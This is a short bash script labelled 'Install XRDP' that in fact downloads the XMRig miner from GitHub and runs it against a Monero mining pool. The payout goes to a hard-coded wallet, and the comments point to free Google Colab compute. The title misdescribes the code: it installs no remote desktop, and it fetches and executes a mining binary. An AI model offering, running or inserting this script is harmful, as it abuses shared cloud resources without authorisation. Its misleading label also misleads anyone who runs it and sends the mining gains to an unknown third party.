#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz
tar xvzf xmrig-6.17.0-linux-x64.tar.gz
cd xmrig-6.17.0
./xmrig -o pool.minexmr.com:4444 -u 488B88tTzQmW6TgzeNfsRABh6a7V6mhBqHPXBQssWJh7XDU1K2DbeNsD2rWr267DVzWgoD8FyrkqRVzotSM7MkmK7i8ac4c -k --tls --rig-id GC-US
